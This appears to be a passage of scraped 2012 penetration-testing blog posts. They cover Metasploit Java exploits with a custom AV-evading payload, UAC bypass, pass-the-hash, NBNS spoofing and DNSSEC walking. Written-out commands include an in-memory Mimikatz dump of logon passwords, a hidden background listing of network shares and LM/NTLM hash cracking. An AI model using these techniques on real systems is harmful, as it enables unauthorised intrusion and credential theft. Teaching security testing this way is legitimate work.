Folders","uri":"https://malicious.link/posts/2012/2012-12-24-delete-trustedinstaller-only-files-and-folders/"},{"categories":["java","metasploit"],"content":"Let me say first off that this isn’t the most elegant of ways to accomplish it. It is in the “it works for me” stage. A quick primer on EXE::Custom: This is a setting just like RHOST in Metasploit wherever an EXE is built for Windows payloads. Such as PSEXEC, BypassUAC, etc. It tells Metasploit to ignore all of your payload settings and just use the EXE you have specified. Now this does come at a bit of a cost. If you don’t have a handler set up to catch whatever is in your EXE and you have bogus information in your payload settings for your module, Metasploit won’t be able to magically determine what you want it to do. So make sure that you either have the payload settings correct (even though it won’t use them for the exploit) or set the option “DisablePayloadHandler” to true and start your own handler somewhere else. With that said, the Java Signed Applet attack is one of the most widely used, one problem in the Metasploit module version is that you have no external control (such as EXE::Custom) for the binary that is dropped if you are using a Windows native payload. (I do highly recommend trying out Java Meterpreter, but that it for another post) Here is the hack that gets me by until a more elegant solution is thought up by smarter people than I: We are going to use the Java Rhino exploit, and this story starts with an undetectable.exe sitting in /tmp/ - How you bypass the AV you are up against is up to you. The first thing we need to do is make a core library change. Yes, this is as scary as it sounds and you should document any time you do so you can revert as needed. In your MSF directory open up lib/msf/util/exe.rb - should look something like this: Scroll down or search for self.to_jar - should look something like this: Now add exe = File.read('/path/to/your/evil.exe') as demonstrated below: Cool. We’ve made our change, now we have to pull down a jar generated with our evil bin, and the Rhino exploit. We can do that by spinning up Metasploit with our newly editing core library. Load up the Rhino exploit via use exploit/multi/browser/java_rhino. One trip up that I messed up even just creating this blog post (and a constant headache in the #Metasploit channel on Freenode) is forgetting to set the TARGET variable in Java exploits. The default payload type being Java. Since we are using a native windows binary we need to specify Windows by setting TARGET 1. Run the exploit with any settings, since we’ll be just pulling out what we need. Then pull down the exploit JAR file with wget: (Most java exploits are set to answer ANY .jar extension request with the payload.) The HTML to load the JAR is pretty straight forward, but if you’ve never seen it before here it is: Thats it. A very blank page with an exploit in it. We can do better than that: Obviously you can do whatever you want with the HTML, mirror a site or what have you. Notice that I’ve also changed the name of the JAR. (You can’t change the class unless you start making changes to the exploit directly and I wanted to keep this as generically applicable as possible) Move the Applet.jar to SuperMario.jar and start up a Web server (for demo using Python’s awesome SimpleHTTPServer, but apache will serve as well) Don’t forget to start up a handler for our now-external exploit: Victim views the site: And WA-LA! we haz shell: Yay… Game over.. ","date":"2012-11-19","objectID":"https://malicious.link/posts/2012/2012-11-19-execustom-in-metasploits-java-exploits/:0:0","tags":null,"title":"EXE::Custom in Metasploit's Java Exploits","uri":"https://malicious.link/posts/2012/2012-11-19-execustom-in-metasploits-java-exploits/"},{"categories":["cli"],"content":"Looking through network shares can be slow, and waiting for individual searches to finish looking through the whole “drive” is redundant. Easier to just use some Windows voodoo to get a good list to look through offline: start /b cmd /c dir /b /s \\\\nas\\users_home_share$ ^\u003e shareinfo.txt Breaking that down: start /b - starts a process that won’t hang up our current one, with the “b” flag meaning “background”, yay not visible to the user! (unless your process forces it back) cmd /c - no reason to explain this one it runs something.. (since dir isn’t an executable but something that resides inside of cmd this is needed) dir /b /s - the “s” means sub directories and pretty widely known. The one that isn’t as well known is the “b” which means “bare” format. Also known as “puts-path-on-every-line-to-make-it-easy-to-find-and-grep-stuff” mode. The path is arbitrary, if you didn’t know you could dir list a UNC path, now ya do. The ^\u003e is the cool trick. If you use “start” to create a process in the background, re-routing its output to a file instead of just getting the fact that start began (the only thing start outputs), is made possible by this lowly ‘carrot’ before the greater-than. And that’s it. With big drives, come back in an hour or two and you’ll have a perfectly grep-able file waiting for you to grep through for file names and extensions to your heart’s content. One caveat, don’t freak out if it’s been 30 minutes and the file size is still ZERO. It doesn’t write the output until the end, it write buffered in the process and then “start” pulls it back out at the end with the carrot. ","date":"2012-11-13","objectID":"https://malicious.link/posts/2012/2012-11-13-smash-and-grab-windows-dir-lists/:0:0","tags":null,"title":"Smash and Grab: Windows Dir Lists","uri":"https://malicious.link/posts/2012/2012-11-13-smash-and-grab-windows-dir-lists/"},{"categories":["metasploit","meterpreter"],"content":"You’ve got shell, and a set of credentials but you’re coming up empty on what you can do with those credentials. This is especially problematic when you can’t get past UAC as you are either in a AlwaysNotify situation or not a local admin. (I’m not trying to pull some some “insert magic here” on the assumption of credentials just at the time of this writing I have only just started working (created a blank file) on a post module to do this as your current user, so until then, you need credentials) Enter the auxiliary module: auxiliary/admin/smb/check_dir_file First we set up a route as aux modules don’t have a “SESSION” parameter: Use the module and set our credentials: Next, set ADMIN$ as we can’t guarantee C$ is the primary drive, but ADMIN$ will definitely be the WINDOWS directory. Our RHOSTS is our target range A simple ‘run’ and away it goes: So we can see that our lowly user that doesn’t have any chance of bypassing the UAC on his current system can pivot to these other systems (172.16.10.10, and 172.16.10.150) quite easily. ============================================================================= The rest of this has nothing to do about admin access, just some tricks to do it better ============================================================================= As many of you know I’m not a huge fan of sending packets I don’t need to so instead of just spraying a range (which I doubt would be seen, but why take the chance?) [Update: While computer_browser_discovery does lookup all the hosts and sends -more- packets than check_dir_file would, those extra packets are sent at DNS resolvers not into empty space that can be detected by network sensors] Enter computer_browser_discovery: This module does the equivalent of ’net view’ to get a list of computers on the domain. You can change the LTYPE to “SQL” to just get MSSQL boxes but we’re going for everything: As you can see WIN7X86 (the box we are on came up with 0.0.0.0) expected. and the .150 address didn’t show up at all as it’s not on the domain. So the benefits is that it’s quieter on the wire and you probably will find hosts that aren’t in your immediate IP range. (Not the case here simply because I don’t have a big enough test network). The disadvantages are as with the .150 address you may miss hosts. Next we add the found host’s IP addresses to a text file (targethosts.txt) [because at the time of this writing the computer_browser_discovery module doesn’t add the hosts to the MSF database] Then use the smb_version module which does a couple things, it verifies that the hosts are there and alive, adds them to the MSF database, and what version of Windows (or samba) they are running: (We still have our route set up so this is module is going through our low privilege user still) And now we have info in the DB for better targeting: Then back in our check_dir_file module we just use the hosts -R to have the database automatically set RHOSTS to the hosts in the database that match your search or alternatively use services -p 445 -R to add all the hosts that you’ve found port 445 open (everything smb_version finds will be shown in services) One more way you can get hosts is doing reverse lookups of ranges. You can just hit a range you know of, or guess ranges based on the computer_browser_discovery results. You can do this with resolve_ip module (this can be pretty slow on ranges that don’t have many hosts): I used the range this blog is hosted on 1) because for some reason my stupid VM wasn’t resolving internal stuff 2) To demonstrate that you can use the module to resolve anything, not just internal ranges. So to wrap up, we have a ton of ways to find hosts that don’t involve traditional scanning (smb_version is the only thing that comes close). And we’ve located two hosts that we have the ability to administer. One oddly enough being the domain controller, so don’t ever discount the access you already have. Tunnel vision is the pentesters worst enemy. ","date":"2012-10-31","objectID":"https://malicious.link/posts/2012/2012-10-31-finding-admin-access/:0:0","tags":null,"title":"Finding Admin Access","uri":"https://malicious.link/posts/2012/2012-10-31-finding-admin-access/"},{"categories":["metasploit","meterpreter","uac"],"content":"Dave Kennedy and Kevin Mitnick submitted the “bypassuac” post module to Metasploit a while back (last DerbyCon?). Which is awesome and they did some fantastic work, but I had a few complaints as probably anyone did who used the module on a somewhat modern network. “Old” module post/windows/escalate/bypassuac: I decided to give it a bit of a face lift: “New” local exploit module exploit/windows/local/bypassuac: All of the credit for the availability of this module goes to @egyp7 though, without his epic addition of local exploits to Metasploit the majority of the updates to this module wouldn’t be possible. Anywho, on to the new features: You can set any windows payload you want to use now: and yes it supports EXE::Custom. It lets you know if it will be able to bypass the current setting of UAC or not: Even when you’re going overkill with it: (ASK module if UAC is disabled will just elevate without any kind of user prompt) And of course it works as expected if UAC needs bypassing: One thing I have yet to update is a simple check to make sure you are an admin that can actually bypass UAC. If you aren’t, then you’ll be leaving this lovely calling card behind for the user: ","date":"2012-10-30","objectID":"https://malicious.link/posts/2012/2012-10-30-bypassuac-got-a-facelift/:0:0","tags":null,"title":"BypassUAC got a facelift","uri":"https://malicious.link/posts/2012/2012-10-30-bypassuac-got-a-facelift/"},{"categories":["cracking","jtr"],"content":"Since I didn’t see any documentation bringing how to take an LM hash that you’ve cracked and convert it to the NTLM equivalent all in one place. And I google how to do it almost every time. I wanted to put all these links in one place and remember how to do it for john. Go-go-gadget blog-notes. So there is this: https://github.com/snarez/rcracki/blob/master/lm2ntlm.cpp And this: https://github.com/rapid7/metasploit-framework/blob/master/tools/lm2ntcrack.rb And this: http://www.securityfocus.com/tools/6696 And the edited version of the above: http://atenlabs.com/blog/so-you-pillaged-a-domain-controllers-hashes/ But Metasploit’s is currently borked,(Update: this is now fixed) I don’t want to compile cpp, and perl sucks. One thing I did find was that someone submitted it to the JtR dev mailing list here: http://www.openwall.com/lists/john-dev/2011/03/29/7 And I asked on that same list what had become of it: http://www.openwall.com/lists/john-dev/2012/10/24/2 The result is as follows: Given this hash: Administrator:500:AA1AB12D9BE8C0D18F900ABF62624751:A2855453E8F6E555E5F22956F7DAA398::: which is the LM and NTLM equiv of SUPERPASSWORD/SuPerPaSsWord respectively. So just so I don’t have to make a screen shot of a text file assume that hash exactly as-is is in pwdump.txt. cracked the LM side in 16 seconds. Now you don’t need to use John to get the LM side (rainbow tables work better at times), Solar Designer (JtR’s main dev) suggested the following path: A bit hard to read but here are the commands: ./john -show pwdump.txt | cut -d: -f2 \u003e cracked ./john -w=cracked -rules:nt -format=nt pwdump.txt As you can see (if you squint) that works well. Rich Rumble suggested: http://www.openwall.com/lists/john-dev/2012/10/24/3 using the loopback as so: ./john pwdump.txt -format=nt -loopback=john.pot -rules=nt The loopback been an amazing addition that is as Solar Designer put it “not in core JtR, it is a fairly recent addition to jumbo”. The loopback allows you to use previously cracked passwords as a dictionary without doing any cut/awk/sed voodoo. The problem with the suggested method for going from LM to NTLM and the loopback option is that it (rightly so) identifies LM hashes by their halves. When it tries to use those halves to crack the NTLM, every with the NT rule-set, it sees each half as separate passwords to try, so it fails. ","date":"2012-10-24","objectID":"https://malicious.link/posts/2012/2012-10-24-lm2ntlm-with-john-the-ripper/:0:0","tags":null,"title":"lm2ntlm with John the Ripper","uri":"https://malicious.link/posts/2012/2012-10-24-lm2ntlm-with-john-the-ripper/"},{"categories":["dns"],"content":"TL;DR – DNSSEC Walker traverses a domain’s DNSSEC records to locate it’s regular DNS records. I like to go through slides of cons I can’t make it out to, and Hack-in-the-Box (HITB) Kul (Malaysia), was one such as they were very quick to release sides: http://conference.hitb.org/hitbsecconf2011kul/materials/ One that I came across is Marc “van Hauser” Heuse’s talk on IPv6 titled “IPv6 Insecurity Revolutions” (Link directly to PDF on aforementioned materials link). I definitely recommend checking it out as well as the IPv6 tools THC / Marc released (v2) here: http://www.thc.org/thc-ipv6/ Amazing tools, but one I could not locate in their batch was dnssecwalk (slide 41 for those following along) I found something that looks very similar here: http://josefsson.org/walker/ Released originally in 2001 by Simon Josefsson. If you read the TL;DR at the top, you pretty much know what to tool does, so I’ll take you through an example: To get this bad boy working (since it’s Perl) you need to use CPAN to install Net::DNS and Net::DNS::SEC cpan Net::DNS (hit enter for defaults) cpan Net::DNS::SEC (same deal) Using the slide’s example of ripe.net (ARIN’s Euro brother) You simply point it at a domain: ./walker ripe.net ;; Walker by Simon Josefsson ;; $Id: walker,v 1.31 2005/09/20 10:16:30 jas Exp $ ;; Net::DNS 0.68 ;; Net::DNS::SEC 0.16 Then it just starts going. Unlike the tool in the slides it’s a very verbose tool and doesn’t have any “write output to file” option so piping to a file is recommended. $ ./walker ripe.net \u003e output.txt \u0026 [1] 32623 Then just run greps on it removing all of the DNS commenting with anything having a semicolon in it: $ cat output.txt | grep -v ';' | grep IN ripe.net. 273 IN SOA pri.authdns.ripe.net. dns.ripe.net. ( ripe.net. 17146 IN A 193.0.6.139 ripe.net. 300 IN AAAA 2001:67c:2e8:22:0:0:c100:68b ripe.net. 2814 IN DNSKEY 256 3 5 ( ripe.net. 2814 IN DNSKEY 257 3 5 ( ripe.net. 2814 IN DNSKEY 257 3 5 ( ripe.net. 2814 IN DNSKEY 256 3 5 ( ripe.net. 183 IN MX 200 postgirl.ripe.net. ripe.net. 183 IN MX 250 postlady.ripe.net. ripe.net. 2017 IN NS tinnie.arin.net. ripe.net. 2017 IN NS ns3.nic.fr. ripe.net. 2017 IN NS sns-pb.isc.org. ripe.net. 2017 IN NS pri.authdns.ripe.net. ripe.net. 2017 IN NS sec3.apnic.net. ripe.net. 2017 IN NS sec1.apnic.net. ripe.net. 2723 IN NSEC 256cns.ripe.net. A AAAA DNSKEY MX NS NSEC RRSIG SOA ripe.net. 21510 IN RRSIG A 5 2 21600 20121120100104 ( ripe.net. 210 IN RRSIG AAAA 5 2 300 20121120100104 ( ripe.net. 3510 IN RRSIG NS 5 2 3600 20121120100104 ( ripe.net. 210 IN RRSIG MX 5 2 300 20121120100104 ( 7Te5Hfqh79JcJO4m94PLZ/GXnm3OVuKW1GINiNToNnTbz ripe.net. 3510 IN RRSIG NSEC 5 2 3600 20121120100104 ( ripe.net. 3510 IN RRSIG SOA 5 2 3600 20121120100104 ( bfTSOsob1qYKrv3MrTrxDcr0dQJMjEUuKvWJINbFsCDDp ripe.net. 3510 IN RRSIG DNSKEY 5 2 3600 20121120100104 ( ILjTJkBEsfhSs/7RKpoS+rLVOINoQXOtGgBhl5Ex5aAip 256cns.ripe.net. 20814 IN CNAME pip.ripe.net. 256cns.ripe.net. 2793 IN NSEC _jabber._tcp.ripe.net. CNAME NSEC RRSIG _jabber._tcp.ripe.net. 2804 IN NSEC _xmpp-client._tcp.ripe.net. NSEC RRSIG SRV _jabber._tcp.ripe.net. 2814 IN RRSIG NSEC 5 4 3600 20121120100104 ( _jabber._tcp.ripe.net. 114 IN RRSIG SRV 5 4 900 20121120100104 ( _jabber._tcp.ripe.net. 114 IN SRV 30 30 5269 chat.ripe.net. _xmpp-client._tcp.ripe.net. 2804 IN NSEC _xmpp-server._tcp.ripe.net. NSEC RRSIG SRV _xmpp-client._tcp.ripe.net. 115 IN RRSIG SRV 5 4 900 20121120100104 ( _xmpp-client._tcp.ripe.net. 2815 IN RRSIG NSEC 5 4 3600 20121120100104 ( _xmpp-client._tcp.ripe.net. 115 IN SRV 30 30 5222 chat.ripe.net. _xmpp-server._tcp.ripe.net. 2805 IN NSEC access.ripe.net. NSEC RRSIG SRV _xmpp-server._tcp.ripe.net. 115 IN RRSIG SRV 5 4 900 20121120100104 ( NJpdcDaytdKNINLVCFYUJWRnXiTRFrXSi2cL4nJLGLQlt _xmpp-server._tcp.ripe.net. 2815 IN RRSIG NSEC 5 (snipped) But of course in side 40 it shows that you can simply zone transfer ripe.net anyways. But for those that aren’t so forthcoming with their zones this can be a nice thing to try. ","date":"2012-10-22","objectID":"https://malicious.link/posts/2012/2012-10-22-axfr-for-dnssec-dnssec-walker/:0:0","tags":null,"title":"AXFR for DNSSEC: DNSSEC Walker","uri":"https://malicious.link/posts/2012/2012-10-22-axfr-for-dnssec-dnssec-walker/"},{"categories":["metasploit","proxy"],"content":"One of the great things about the reverse_http(s) payloads is that it is proxy aware. However one of the pitfalls to this is that SYSTEM doesn’t have proxy settings, nor do users who have never logged into a system (unless profile loading is triggered). The problem here arrises when you are trying to do anything as SYSTEM, also the PSEXEC only has the option of getting you a SYSTEM shell (so you’re done for right out of the door) Now, there is a stub in Metasploit that I have been unable to complete due to my lack of knowledge in the shell code world. The stub allows you to create payloads that have static proxies, which basically invalidates the need for the following. Until then here is a few ways to set / read the proxy settings for SYSTEM or any other user for that matter. Its here if you want to take a whack at it: external/source/shellcode/windows/x86/src/block/block_reverse_https_proxy.asm One of the ways @carnal0wnage and I demoed @DerbyCon was using the bitsadmin binary. Windows7/Vista/2008 come with version 2.0+ which has this great ability to run the following: bitsadmin /util /setieproxy localsystem MANUAL_PROXY 192.168.1.55:3128 \";\" (2000,XP,2003 you could upload a copy of bitsadmin that was new enough and that would still work) That command sets the proxy settings for the SYSTEM account. I was able to jump through hoops and do this remotely by using the windows/exec payload via psexec, then reverse_http(s) would work. But I wanted a better way to do this. I watched the execution of bitsadmin to see what it was doing and all it was actually doing is setting a registry key. Awesome, I can do that. Enter enum_proxy: And… If you’ve noticed that RHOST option, Metasploit has the ability to do remote registry calls as well (this module will attempt to start the RemoteRegistry service if the user has the privilege to do so): Output from it finding a disabled RemoteRegistry: msf post(enum_proxy) \u003e run [-] Unable to contact remote registry service on 172.16.10.217 [*] Attempting to start service remotely... [*] Proxy Counter = 9 [*] Setting: WPAD and AutoConfigure script [*] AutoConfigURL: http://anotherproxyserver/pac.pac [*] Post module execution completed “Awesome but you promised setting the proxy settings”, well right now all I can give you is a cloner ;-) Enter clone_proxy_settings module: And thats it. Still working on an actual “set_proxy” module, but this should do for now, and a lot less to type. As of this post both are currently pull requests: https://github.com/rapid7/metasploit-framework/pull/942 https://github.com/rapid7/metasploit-framework/pull/943 ","date":"2012-10-21","objectID":"https://malicious.link/posts/2012/2012-10-21-setting-systems-proxy-settings-with-metasploit/:0:0","tags":null,"title":"Setting SYSTEM's proxy settings with Metasploit","uri":"https://malicious.link/posts/2012/2012-10-21-setting-systems-proxy-settings-with-metasploit/"},{"categories":["metasploit","meterpreter","smb"],"content":"Ok, this is pretty straight forward no magic: Got a shell, doesn’t have to be SYSTEM Add a route to the internal range or directly to the host you want over the session you want Mosy on over to the Socks4a module. And in another terminal we need to make sure our proxychains.conf file in /etc/ or where ever you store your conf is correct. It defaults to 9050 on 127.0.01 for Tor, that’s pretty easy to cope with and no reason to mess with it if you actually use it for Tor for other things. Run the socks proxy with the Tor-like settings. (Remember to shutdown Tor first) And the rest is gravy. The % (percent sign if blog software mangles it) is a delimiter that smbclient and other samba tools recognize between user and password (so it doesn’t prompt you for it). And just to love it working: yay files.. Yes I know I didn’t use smbmount but it works the same as well as rpcclient. A side note here is if you are using the pth-tools from: https://code.google.com/p/passing-the-hash/ You can use hashes instead of passwords for stuff like this. But who are we kidding? Who doesn’t get clear text passwords anymore ;-) ","date":"2012-10-17","objectID":"https://malicious.link/posts/2012/2012-10-17-mounting-smb-shares-over-meterpreter/:0:0","tags":null,"title":"Mounting SMB shares over Meterpreter","uri":"https://malicious.link/posts/2012/2012-10-17-mounting-smb-shares-over-meterpreter/"},{"categories":["uac","tools"],"content":"UPDATE: THIS IS ONLY WORKS WITH THE LOCAL ADMIN (ID 500) ACCOUNT AND PASSWORD (MY MISTAKE FOR NOT TESTING MORE) So the “-ish” is you need to have the username and pass of another account that has administrator rights the local administrator account on that box. But other than that, the following image should speak for itself. (no UAC prompt occurred during the following actions) I plan on writing a Metasploit module to do this as all it really does is starts a process as a different user and that process executes ShellExecute’s ‘RunAs’ verb. But until then, get CPAU here: http://www.joeware.net/freetools/tools/cpau/ and Elevate here: http://jpassing.com/2007/12/08/launch-elevated-processes-from-the-command-line/ and doing it manually with built in Windows Kung-Fu: ","date":"2012-10-16","objectID":"https://malicious.link/posts/2012/2012-10-16-uac-alwaysnotify-bypass-ish/:0:0","tags":null,"title":"UAC AlwaysNotify Bypass-ish","uri":"https://malicious.link/posts/2012/2012-10-16-uac-alwaysnotify-bypass-ish/"},{"categories":["passthehash"],"content":"I read this article a while back: http://fuzzynop.blogspot.com/2012/09/pass-hash-without-metasploit.html by @FuzzyNop Great article showing the use of WCE’s “-s” flag to Pass-The-Hash locally and I highly recommend checking it out. Anywho, I was once in a similar scenario, where I had no Metasploit to back me up, but the box I was on did have one interesting thing, ruby and an accessible target for relatively up-to-date ruby gems. Since Metasploit’s powerhouse library ‘rex’ installed just fine I was set. Notice: This is now gem install librex Then copy the following to the machine: https://github.com/rapid7/metasploit-framework/blob/master/tools/psexec.rb That’s a standalone version of psexec module (minus any advanced options). Once you have it down, make two quick edits (removing the requires for fast lib and msfenv): And then you should see this: Now, I elected to use the windows/adduser Metasploit single for my purposes, you can just as well use any executable you want depending on what you are trying to accomplish. So this is the users list before hand: And then I executed this: Which resulted in: w00t. Game over. But wait, there’s more… There is another GEM that makes things even easier to continue if your next hop doesn’t have Ruby: http://ocra.rubyforge.org OCRA (One-Click-Ruby-Application), you just need to ‘gem install ocra’ and you can then compile Ruby into Windows executables (it does this the same way as Py2Exe - packaging a interpreter in with the script). To build the executable (once our gem is installed) is pretty straight forward: And as you can see, we have a ~5.5 meg file: The output without options looks like this: You can plainly see the Temp directory it’s being extracted to. It does do a very good job at cleaning up the temp directory after it’s run the Ruby script which is nice, but not forensically (obviously), just a heads up. But, the result is the same: Now you can take your 5.5 meg bin anywhere you want and psexec with a hash to your heart’s content. (As a side note, this works REALLY well to bypass UAC if you have a username and password/hash for a local admin. Just don’t forget that it runs the EXE as SYSTEM, who normally doesn’t have proxy settings) ","date":"2012-10-15","objectID":"https://malicious.link/posts/2012/2012-10-15-pass-the-hash-without-metasploit-part-2/:0:0","tags":null,"title":"Pass the Hash without Metasploit - Part 2","uri":"https://malicious.link/posts/2012/2012-10-15-pass-the-hash-without-metasploit-part-2/"},{"categories":["ditto","tools","releases"],"content":"If you follow the exact same steps you did for Netview: /blog/2012/10/07/compiling-and-release-of-netview/ then you already have the steps needed to create a compiled version of ditto from the repo here: https://github.com/mubix/ditto And while the sheep icon is cute, and a nod to what ditto does, it comes at a pretty hefty cost: Size. Now if you’re scoffing at 408 KB then you don’t have any issues, but I like not having to wait while a binary I am trying to push to a victim box is transferring. Removing the icon is pretty straight forward. Once you’ve loaded the .SLN file up in Visual Studio C++ just expand the “Resource Files” folder in the “Solution Explorer”: And summarily delete both files (Right click and go to Remove or just press the Del button) (Side note, don’t forget to rename or copy the one with the icon somewhere first if you want to keep that version) Then “Build Solution” again, and wa-la! A much smaller, less witty but highly functional Ditto: And of course, like last time, you could go through all that, or just download them here: Without the icon: /projects/ditto_noicon.exe With the icon: /projects/ditto_withicon.exe ","date":"2012-10-08","objectID":"https://malicious.link/posts/2012/2012-10-08-compiling-and-release-of-ditto/:0:0","tags":null,"title":"Compiling and Release of Ditto","uri":"https://malicious.link/posts/2012/2012-10-08-compiling-and-release-of-ditto/"},{"categories":["netview","tools","releases"],"content":"If you haven’t caught Chris Gates (@carnal0wnage) and my talk at DerbyCon 2012 - we released 2 tools, Netview, and Ditto. Here I’ll walk you through compiling Netview yourself, in the next blog post we’ll go over compiling Ditto and how you can remove it’s icon to reduce the size if you want. But for Netview it’s pretty straight forward. First you pull a copy of the GIT repository: https://github.com/mubix/netview Once you’ve done that, you’ve got a directory looking like this: You will also need Visual Studio C++ (The Express version if free here: http://www.microsoft.com/visualstudio/eng/downloads#d-2010-express ) Once you have both you double click the .sln file (Solution File) And you get a ugly blue and purple box like this: Where you switch the compile option from “Debug” to “Release” and click to “Build Solution”: Sounds much more grandiose than it really is. If all goes well you’ll get the box at the bottom to say “Build: 1 succeeded” You’ll have a new folder: and inside is your wonderful prize: You could go through all of that… or just download it here: /projects/netview.exe ","date":"2012-10-07","objectID":"https://malicious.link/posts/2012/2012-10-07-compiling-and-release-of-netview/:0:0","tags":null,"title":"Compiling and Release of Netview","uri":"https://malicious.link/posts/2012/2012-10-07-compiling-and-release-of-netview/"},{"categories":["analogx","lab","peerblock","proxy","tools"],"content":"pfSense is an excellent free way of including a firewall / ids / proxy in your lab or VMs. It runs small and fast, but even as simple as pfsense is sometimes you need a bit less complexity and speed of configuration. Enter Peerblock and AnalogX’s proxy. Two free tools, one usually used to stop people who torrent from getting caught by the RIAA/MPAA and the other a drop dead simple windows based proxy utility. First we’ll talk about AnalogX’s proxy, you can get it here: http://www.analogx.com/contents/download/Network/proxy/Freeware.htm A simple next-\u003enext-\u003efinish install gets you this: With the following ports listening: HTTP (web browsers) (port 6588) HTTPS (secure web browsers) (port 6588) SOCKS4 (TCP proxying) (port 1080) SOCKS4a (TCP proxying w/ DNS lookups) (port 1080) SOCKS5 (only partial support, no UDP) (port 1080) NNTP (usenet newsgroups) (port 119) POP3 (receiving email) (port 110) SMTP (sending email) (port 25) FTP (file transfers) (port 21) So you can test everything to your hearts content that it goes through a proxy, using any proxy type you want basically. (I will assume here that you know how to setup your own proxy settings for your OS) But the problem being that if your code / application misbehaves it will still get out. You could go to the trouble of fiddling with the Windows firewall if you are running Windows 7 (not sure if XP can box egress, probably can). But I like simple and straight forward solutions. PeerBlock can be found here: http://www.peerblock.com And is simple to set up as well (next-\u003enext-\u003efinish applies). Go into List Manager once you have it installed and “Create a List” Give it a description and a place to save the file: You’ll get this window automatically pop up, but if you don’t you just click ‘Add’ with your custom list selected in the List Manager: Feel free to block everything but one IP, a range, or whatever your meets your needs, nothing in or out from or to that IP/Range will be allowed One of the uses I use it for is blocking the whole Internet except for my internal ranges for stuff like my personal Virus Total lab where I run bins to test stuff out, that way the AntiVirus services can’t ship my bin off to who knows where to be analyzed before I even get to use it. Here is an example of my “All the Internet” block list: Thats everything for now, hope some of it was useful in your setup and experiments ;-) ","date":"2012-10-06","objectID":"https://malicious.link/posts/2012/2012-10-06-lab-setup-windows-proxy-and-egress-filtering/:0:0","tags":null,"title":"Lab Setup - Windows Proxy and Egress Filtering","uri":"https://malicious.link/posts/2012/2012-10-06-lab-setup-windows-proxy-and-egress-filtering/"},{"categories":["metasploit"],"content":" Once you’re done staring at the Star Trek deity above (it’s a staring contest you will loose since you a such a simplistic race). I pull your attention to: https://github.com/mubix/q This repository / exploit pack was created for the sole purpose to house modules, scripts and resource files that would otherwise not be accepted into the Metasploit trunk. It will always be free and anyone is free to submit pulls of modules, scripts or resource files that they created or just found and were not accepted to the trunk because it was just a script, it violates TOS of a service, they did not author it, or any other possible reason. (Like the fear of @egyp7 ‘s coding red pen) While I completely understand the reason and possible backlash Metasploit and subsequently Rapid7 might get for housing modules that were not submitted by their original owners, or violate some TOS, I feel that those modules should not simply disappear into time. With that said, if a module gets added to this repo by another person and the other contacts me to take it down I certainly will. So if you have modules, scripts, resource files or anything else that you would like to share, please submit a pull request, and we’ll see about getting it shared out for other people to use. P.S. I am, as evident by this blog, a friend of the framework, so I would do my best to remove the blockage that is stopping the item from being in the Metasploit trunk if at all possible. This repo / exploit pack is meant to support the framework, not subjugate it in any way. ","date":"2012-10-04","objectID":"https://malicious.link/posts/2012/2012-10-04-meet-q-free-metasploit-exploit-pack-html/:0:0","tags":null,"title":"Meet “q” – Free Metasploit Exploit Pack","uri":"https://malicious.link/posts/2012/2012-10-04-meet-q-free-metasploit-exploit-pack-html/"},{"categories":["metasploit","mimikatz"],"content":"Executing WCE.exe in memory as demoed by Egypt here: https://community.rapid7.com/community/metasploit/blog/2012/05/08/eternal-sunshine-of-the-spotless-ram has two issues with it. 1, you leave a file on disk with your hashes and clear text passwords. That just won’t do. 2. There is this DLL called WCEAUX.dll that gets written for the briefest second to disk: (yes I realize I’m running this on disk ‘wce32.exe’, but it exhibits the same DLL drop when doing in-memory) Now, don’t get me wrong, I love WCE, and Hernan Ochoa does an amazing job with it, but when it comes down to it, it’s the best tool for the job. And today, that’s now Mimikatz. Just like WCE to execute it in memory you use the -m flag for execute: meterpreter\u003e execute -H -i -c -m -d calc.exe -f mimikatz.exe -a '\"sekurlsa::logonPasswords full\" exit' For mimikatz to automatically send commands require double quotes in the command line arguments, so we use single quotes in meterpreter to encircle the execute arguments (-a). Running first “sekurlsa::logonPasswords full” then ’exit’ to auto-exit mimikatz console. Like so: And all you get forensically is calc.exe loading a ton of DLLs it has no business loading but no new files touch disk ;-) The downloads for Mimikatz are were they always are: http://blog.gentilkiwi.com/mimikatz Oh, did I mention that Mimikatz is open source and the in-memory goodness has been uploaded to svn: https://code.google.com/p/mimikatz/ Awesome work @gentilkiwi If you want to check out the the fix that was implemented to work with Meterpreter’s in-memory goodness check here: https://code.google.com/p/mimikatz/source/detail?r=33 ","date":"2012-09-06","objectID":"https://malicious.link/posts/2012/2012-09-06-completely-in-memory-mimikatz-with-metasploit/:0:0","tags":null,"title":"Completely In-memory Mimikatz with Metasploit","uri":"https://malicious.link/posts/2012/2012-09-06-completely-in-memory-mimikatz-with-metasploit/"},{"categories":["nbns","tools"],"content":"So it turns out that Windows Firewall talks IP addresses just like any other firewall, so if you configure FakeNetBIOSNS to tell everyone that the IP address for whatever they looked up is YOUR IP, guess what, no need to bypass the spoof filters ;-) Happy Rob! $ cat nbns.ini PROJECTMENTOR WPAD 172.16.10.207 PROJECTMENTOR FILESHARE 173.26.10.207 Results in: Game ON! ","date":"2012-09-02","objectID":"https://malicious.link/posts/2012/2012-09-02-old-school-on-target-nbns-spoofing-part-2/:0:0","tags":null,"title":"Old School On-target NBNS Spoofing - Part 2","uri":"https://malicious.link/posts/2012/2012-09-02-old-school-on-target-nbns-spoofing-part-2/"},{"categories":["nbns","tools"],"content":"One of pen testers favorite attacks is NBNS spoofing. Now Wesley who I originally learned this attack from, traced this back to sid (http://www.notsosecure.com/folder2/2007/03/14/abusing-tcpip-name-resolution-in-windows-to-carry-out-phishing-attacks/) . Wesley’s stuff can be found here: http://www.mcgrewsecurity.com/tools/nbnspoof/ Wesley’s stuff eventually lead to this awesome post on the Packetstan blog: http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html and in that post the Metasploit module to do it all is demoed. But there in lies the rub. With each degree of separation we have more and more solidified in into a “on-site” only attack. But if you read through Sid’s paper from 2007 this doesn’t have to be the case. He uses a tool written by “Patrick Chambet” back in 2005 for the Honeynet project: http://seclists.org/honeypots/2005/q4/46 called “FakeNetbiosDGM and FakeNetbiosNS”. Finding the tools was no easy task though, googling for the file name, the author or the project just netted me this link: http://honeynet.rstack.org/tools/FakeNetBIOS-0.91.zip Gotta love the Wayback Machine, I finally found it here: http://wayback.archive.org/web/*/http://honeynet.rstack.org/tools/FakeNetBIOS-0.91.zip and eventually also here (on the author’s site of all places): http://www.chambet.com/tools.html Question is, does it still work?? 2nd Question, how well does it work through/with Meterpreter? (As a side note, I haven’t tried, but you might be able to use Py2Exe or PyInstaller to run nbnspoof.py on a windows box) When running it on XP SP3 I get the following Booooooooo, and on Windows 7 I get this: Ok, error 10013 is a permissions issue, I can deal with that.. Run as Administrator it works! But 